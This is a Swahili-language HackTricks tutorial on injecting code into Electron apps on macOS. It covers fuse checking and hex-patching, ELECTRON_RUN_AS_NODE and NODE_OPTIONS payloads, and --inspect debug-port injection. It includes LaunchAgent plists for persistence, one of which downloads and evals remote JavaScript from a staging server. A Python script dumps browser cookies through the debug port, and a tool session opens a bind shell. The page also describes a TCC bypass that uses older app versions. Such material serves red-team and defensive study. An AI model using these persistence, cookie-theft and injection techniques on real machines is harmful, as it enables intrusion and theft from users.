# Kuingiza Maombi ya Electron kwenye macOS

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa Msingi

Ikiwa haujui Electron ni nini unaweza kupata [**mengi ya habari hapa**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Lakini kwa sasa jua tu kwamba Electron inaendesha **node**.\
Na node ina **parameta** na **mazingira ya env** ambayo yanaweza kutumika kwa **kuifanya iendeshe nambari nyingine** isipokuwa faili iliyotajwa.

### Fyuzi za Electron

Mbinu hizi zitajadiliwa baadaye, lakini hivi karibuni Electron imeongeza **bendera za usalama kadhaa kuzuia**. Hizi ni [**Fyuzi za Electron**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumiwa kuzuia programu za Electron kwenye macOS kutoa **nambari ya kiholela**:

* **`RunAsNode`**: Ikiwa imelemazwa, inazuia matumizi ya mazingira ya env **`ELECTRON_RUN_AS_NODE`** kuingiza nambari.
* **`EnableNodeCliInspectArguments`**: Ikiwa imelemazwa, parameta kama `--inspect`, `--inspect-brk` haitaheshimiwa. Kuepuka njia hii ya kuingiza nambari.
* **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewezeshwa, faili iliyopakiwa **`asar`** itathibitishwa na macOS. **Kuzuia** njia hii ya **kuingiza nambari** kwa kubadilisha maudhui ya faili hii.
* **`OnlyLoadAppFromAsar`**: Ikiwa hii imewezeshwa, badala ya kutafuta kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**. Itakuwa tu kuchunguza na kutumia app.asar, hivyo kuhakikisha kwamba wakati **inachanganywa** na fyuzi ya **`embeddedAsarIntegrityValidation`** ni **haiwezekani** kusoma nambari **isiyothibitishwa**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewezeshwa, mchakato wa kivinjari hutumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa picha yake ya V8.

Fyuzi nyingine ya kuvutia ambayo haitazuia kuingiza nambari ni:

* **EnableCookieEncryption**: Ikiwa imewezeshwa, hifadhi ya kuki kwenye diski inafanywa kuwa imefichwa kwa kutumia funguo za kryptography za ngazi ya OS.

### Kuangalia Fyuzi za Electron

Unaweza **kuangalia bendera hizi** kutoka kwa programu na:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Kubadilisha Fuses za Electron

Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Fuses za Electron** umesanidiwa ndani ya **binary ya Electron** ambayo ina mahali fulani string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Katika programu za macOS hii kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Ungepata faili hii katika [https://hexed.it/](https://hexed.it/) na kutafuta neno lililopita. Baada ya neno hilo unaweza kuona nambari "0" au "1" inayoonyesha ikiwa kila firimbi imelemazwa au kuwezeshwa. Badilisha nambari ya hex (`0x30` ni `0` na `0x31` ni `1`) **kurekebisha thamani za firimbi**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Tafadhali kumbuka kwamba ukijaribu **kubadilisha** **`Electron Framework` binary** ndani ya programu na byte hizi zilizobadilishwa, programu haitaendeshwa.

## RCE kuongeza nambari kwa Programu za Electron

Kuna **faili za JS/HTML za nje** ambazo Programu ya Electron inatumia, hivyo mshambuliaji anaweza kuingiza nambari katika faili hizi ambazo saini yake haitachunguzwa na kutekeleza nambari ya kupendelea katika muktadha wa programu.

{% hint style="danger" %}
Hata hivyo, kwa sasa kuna vizuizi 2:

* Ruhusa ya **`kTCCServiceSystemPolicyAppBundles`** inahitajika kurekebisha Programu, hivyo kwa chaguo-msingi hili sio tena linalowezekana.
* Faili iliyokompiliwa ya **`asap`** kawaida ina firimbi **`embeddedAsarIntegrityValidation`** `na` **`onlyLoadAppFromAsar`** `kuwezeshwa`

Hii inafanya njia hii ya shambulio kuwa ngumu zaidi (au haiwezekani).
{% endhint %}

Tafadhali kumbuka kwamba inawezekana kukiuka mahitaji ya **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili programu kwenye saraka nyingine (kama **`/tmp`**), kubadilisha jina la folda **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kurekebisha** faili ya **asar** na nambari yako **inayodhuru**, kuirudisha jina kuwa **`app.app/Contents`** na kuitekeleza.

Unaweza kufungua nambari kutoka kwa faili ya asar na:
```bash
npx asar extract app.asar app-decomp
```
Na pakia tena baada ya kuibadilisha na:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE na `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), ikiwa hii variable ya mazingira imewekwa, itaanzisha mchakato kama mchakato wa kawaida wa Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`RunAsNode`** imelemazwa, env var **`ELECTRON_RUN_AS_NODE`** itapuuzwa, na hii haitafanya kazi.
{% endhint %}

### Uingizaji kutoka kwa App Plist

Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia vibaya hii env variable katika plist kudumisha uthabiti:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE na `NODE_OPTIONS`

Unaweza kuhifadhi mzigo katika faili tofauti na kuutekeleza:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** imelemazwa, programu ita**puuza** env var **NODE\_OPTIONS** wakati inapoanzishwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo itakuwa pia **puuzwa** ikiwa fuse **`RunAsNode`** imelemazwa.

Ikiwa haujaweka **`ELECTRON_RUN_AS_NODE`**, utapata **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Kuingiza kutoka kwa Plist ya Programu

Unaweza kutumia vibaya env variable hii katika plist kudumisha uthabiti kwa kuongeza funguo hizi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE na ukaguzi

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ikiwa unatekeleza programu ya Electron na bendera kama vile **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ukaguzi itafunguliwa** ili uweze kuunganisha (kwa mfano kutoka Chrome kwenye `chrome://inspect`) na utaweza **kuingiza nambari ndani yake** au hata kuzindua michakato mipya.\
Kwa mfano:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Ikiwa fuse **`EnableNodeCliInspectArguments`** imelemazwa, programu ita**puuza parameta za node** (kama vile `--inspect`) wakati inapoanzishwa isipokuwa ikiwa mazingira ya env **`ELECTRON_RUN_AS_NODE`** yameset, ambayo itapu**uzwa** pia ikiwa fuse **`RunAsNode`** imelemazwa.

Hata hivyo, bado unaweza kutumia **parameta ya electron `--remote-debugging-port=9229`** lakini mzigo uliopita hautafanya kazi ya kutekeleza michakato mingine.
{% endhint %}

Kwa kutumia parameta **`--remote-debugging-port=9222`** niwezekan**a kuiba baadhi ya taarifa kutoka kwa Programu ya Electron kama **historia** (na amri za GET) au **vidakuzi** vya kivinjari (kwani vina**fumbuliwa** ndani ya kivinjari na kuna **kituo cha json** kitakachowapa).

Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na kutumia zana ya moja kwa moja [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
Katika [**chapisho hili la blogi**](https://hackerone.com/reports/1274695), hii uchunguzi wa kosa la programu unatumika kufanya kivuli cha chrome **kupakua faili za aina yoyote kwenye maeneo ya aina yoyote**.

### Uingizaji kutoka kwa Plist ya Programu

Unaweza kutumia mazingira hii ya env katika plist kudumisha uthabiti kwa kuongeza funguo hizi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Kupuuza TCC Bypass kwa Kutumia Toleo za Zamani

{% hint style="success" %}
Mnyama wa TCC kutoka kwa macOS hachunguzi toleo lililotekelezwa la programu. Kwa hivyo, ikiwa huwezi **kuingiza nambari katika programu ya Electron** kwa kutumia njia yoyote ya awali unaweza kupakua toleo la hapo awali la programu na kuingiza nambari ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Cache ya Imani inazuia hilo).
{% endhint %}

## Tekeleza Nambari Isiyokuwa ya JS

Njia za awali zitaruhusu kuendesha **nambari ya JS ndani ya mchakato wa programu ya electron**. Walakini, kumbuka kwamba **mchakato wa watoto hufanya kazi chini ya wasifu sawa wa sanduku la mchanga** kama programu mzazi na **kurithi ruhusa zao za TCC**.\
Kwa hivyo, ikiwa unataka kutumia vibali kufikia kamera au mikrofoni kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwa mchakato**.

## Kuingiza Kiotomatiki

Zana [**electroniz3r**](https://github.com/r3ggi/electroniz3r) inaweza kutumika kwa urahisi kutafuta **programu za Electron zilizo na mapungufu** zilizosanikishwa na kuingiza nambari ndani yake. Zana hii itajaribu kutumia njia ya **`--inspect`**:

Unahitaji kuikusanya mwenyewe na unaweza kuitumia kama hivi:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Marejeo

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
